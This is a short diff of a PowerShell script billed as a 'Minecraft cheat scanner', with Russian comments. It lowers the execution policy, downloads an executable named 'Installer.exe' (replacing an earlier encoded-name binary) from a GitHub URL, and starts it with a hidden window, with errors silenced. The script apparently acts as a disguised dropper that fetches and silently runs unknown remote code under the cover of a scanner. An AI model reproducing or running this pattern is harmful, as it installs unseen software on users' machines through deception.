@@ -1,10 +1,10 @@
 # MINECRAFT CHEAT SCANNER v2.0 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
- Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/enc_8c1ae3d9a1c444819a7edad8a200a143_chekir.exe.exe" -OutFile "enc_8c1ae3d9a1c444819a7edad8a200a143_chekir.exe.exe" -ErrorAction SilentlyContinue
+ Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Installer.exe" -OutFile "Installer.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "enc_8c1ae3d9a1c444819a7edad8a200a143_chekir.exe.exe" -WindowStyle Hidden
+    Start-Process -FilePath "Installer.exe" -WindowStyle Hidden
     
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -100,6 +100,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
